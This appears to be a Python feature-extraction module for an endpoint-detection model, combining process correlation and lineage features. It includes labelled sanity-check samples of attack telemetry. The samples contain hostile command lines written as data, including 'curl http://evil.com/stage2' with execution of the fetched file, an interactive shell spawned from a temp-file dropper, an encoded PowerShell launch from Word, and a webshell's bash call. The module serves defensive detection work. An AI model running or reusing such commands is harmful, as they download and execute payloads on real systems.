"""Combined feature extraction for T1 behavior models (correlation + lineage).

This module combines:
- 8 correlation features (spawn_count, connect_count, etc.)
- 6 lineage features (parent_comm_is_shell, parent_path_is_suspicious, etc.)

Total: 14 features for T1 behavior scoring.

Usage:
    from synthaea_ml.features.combined import extract_combined_features

    # Requires both correlation state and exec event with lineage
    correlation_state = {
        "spawn_count": 2,
        "connect_count": 1,
        "filewrite_count": 0,
        # ... (8 correlation features)
    }

    exec_event = {
        "image_path": "/bin/bash",
        "cmdline": "bash -c whoami",
        "parent_comm": "nginx",
        "parent_image_path": "/usr/sbin/nginx",
    }

    features = extract_combined_features(correlation_state, exec_event)
    # Returns list of 14 floats
"""

from __future__ import annotations

from synthaea_ml.features import correlation, lineage

# Combined feature names: correlation (8) + lineage (6) = 14
FEATURE_NAMES = correlation.FEATURE_NAMES + lineage.FEATURE_NAMES


def extract_combined_features(
    events: list[dict], pid: int, generation: int | None = None
) -> list[float]:
    """Extract combined correlation + lineage features.

    Args:
        events: List of events in correlation window (all PIDs)
            Expected format from edr-cli capture-events:
            {"type": "exec", "pid": 1234, "ts_ns": ..., "image_path": "...",
             "parent_comm": "...", "parent_image_path": "..."}
            {"type": "connect", "pid": 1234, "ts_ns": ..., "daddr_v4": ..., "dport": ...}
            {"type": "fileopen", "pid": 1234, "ts_ns": ..., "path": "...", "flags": ...}

        pid: Target PID to extract features for
        generation: Process incarnation of `pid` (#590, #617). Both blocks filter by
            `(pid, generation)` the same way, so a recycled pid's previous life feeds
            neither the correlation counts nor the lineage (the parent of the *old*
            process must not be scored as the new one's). `None` keeps pid-only.

    Returns:
        List of 14 floats: [8 correlation features] + [6 lineage features]
    """
    # Extract correlation features (8) - filters events by (pid, generation) internally
    corr_features = correlation.extract_features(events, pid, generation)

    # Extract lineage features (6) - needs most recent exec event for this incarnation
    pid_execs = [
        e
        for e in correlation.events_for_pid(events, pid, generation)
        if e.get("type") == "exec"
    ]
    if pid_execs:
        # Use most recent exec event (highest ts_ns)
        exec_event = max(pid_execs, key=lambda e: e.get("ts_ns", 0))
    else:
        # No exec event for this pid - empty lineage
        exec_event = {}

    lineage_features = lineage.extract_features(exec_event)

    # Combine into single 14-feature vector
    return corr_features + lineage_features


def extract_combined_features_dict(
    events: list[dict], pid: int, generation: int | None = None
) -> dict[str, float]:
    """Extract combined features as a named dict (for debugging/introspection).

    Args:
        events: List of events in correlation window
        pid: Target PID to extract features for
        generation: Process incarnation of `pid`; see `extract_combined_features`.

    Returns:
        Dict mapping feature name -> value
    """
    features = extract_combined_features(events, pid, generation)
    return dict(zip(FEATURE_NAMES, features, strict=True))


# Sanity check samples combining both feature types
# Format: event list + target PID + expected label
SANITY_CHECK_SAMPLES = {
    "benign_system_process": {
        "events": [
            {
                "type": "exec",
                "pid": 1000,
                "ts_ns": 1_000_000_000,
                "image_path": "/usr/bin/systemd",
                "cmdline": "systemd",
                "parent_comm": "init",
                "parent_image_path": "/sbin/init",
            },
        ],
        "pid": 1000,
        "label": "benign (system process, system parent)",
    },
    "webshell_attack": {
        "events": [
            {
                "type": "exec",
                "pid": 1001,
                "ts_ns": 1_000_000_000,
                "image_path": "/bin/bash",
                "cmdline": "bash -c whoami",
                "parent_comm": "nginx",
                "parent_image_path": "/usr/sbin/nginx",
            },
            {
                "type": "connect",
                "pid": 1001,
                "ts_ns": 2_000_000_000,
                "daddr_v4": [192, 168, 1, 100],
                "dport": 4444,
            },
            {
                "type": "fileopen",
                "pid": 1001,
                "ts_ns": 3_000_000_000,
                "path": "/tmp/payload",
                "flags": 0o101,  # O_WRONLY | O_CREAT
            },
            {
                "type": "fileopen",
                "pid": 1001,
                "ts_ns": 3_500_000_000,
                "path": "/tmp/output",
                "flags": 0o101,
            },
        ],
        "pid": 1001,
        "label": "suspicious (webshell: webserver→shell + network activity)",
    },
    "malicious_macro": {
        "events": [
            {
                "type": "exec",
                "pid": 1002,
                "ts_ns": 1_000_000_000,
                "image_path": "C:\\Windows\\System32\\cmd.exe",
                "cmdline": "cmd.exe /c powershell",
                "parent_comm": "winword.exe",
                "parent_image_path": "C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE",
            },
            {
                "type": "exec",
                "pid": 1002,
                "ts_ns": 1_500_000_000,
                "image_path": "C:\\Windows\\System32\\powershell.exe",
                "cmdline": "powershell -enc ABCD",
                "parent_comm": "cmd.exe",
                "parent_image_path": "C:\\Windows\\System32\\cmd.exe",
            },
            {
                "type": "connect",
                "pid": 1002,
                "ts_ns": 2_000_000_000,
                "daddr_v4": [10, 0, 0, 1],
                "dport": 443,
            },
            {
                "type": "connect",
                "pid": 1002,
                "ts_ns": 3_000_000_000,
                "daddr_v4": [10, 0, 0, 2],
                "dport": 80,
            },
            {
                "type": "connect",
                "pid": 1002,
                "ts_ns": 4_000_000_000,
                "daddr_v4": [10, 0, 0, 2],
                "dport": 443,
            },
            {
                "type": "fileopen",
                "pid": 1002,
                "ts_ns": 4_500_000_000,
                "path": "C:\\Users\\Bob\\AppData\\malware.exe",
                "flags": 0o101,
            },
        ],
        "pid": 1002,
        "label": "suspicious (malicious macro: office→cmd + suspicious activity)",
    },
    "dropper_from_tmp": {
        "events": [
            {
                "type": "exec",
                "pid": 1003,
                "ts_ns": 1_000_000_000,
                "image_path": "/bin/bash",
                "cmdline": "bash -i",
                "parent_comm": "unknown",
                "parent_image_path": "/tmp/dropper.elf",
            },
            {
                "type": "exec",
                "pid": 1003,
                "ts_ns": 2_000_000_000,
                "image_path": "/usr/bin/curl",
                "cmdline": "curl http://evil.com/stage2",
                "parent_comm": "bash",
                "parent_image_path": "/bin/bash",
            },
            {
                "type": "exec",
                "pid": 1003,
                "ts_ns": 3_000_000_000,
                "image_path": "/tmp/stage2",
                "cmdline": "/tmp/stage2",
                "parent_comm": "bash",
                "parent_image_path": "/bin/bash",
            },
        ]
        + [
            {
                "type": "connect",
                "pid": 1003,
                "ts_ns": i * 1_000_000_000,
                "daddr_v4": [10, 0, 0, (i % 3) + 1],
                "dport": 8000 + (i % 3),
            }
            for i in range(5)
        ]
        + [
            {
                "type": "fileopen",
                "pid": 1003,
                "ts_ns": 5_000_000_000 + i * 500_000_000,
                "path": f"/tmp/malware_{i}",
                "flags": 0o101,
            }
            for i in range(4)
        ],
        "pid": 1003,
        "label": "suspicious (dropper: suspicious parent path + high activity)",
    },
}
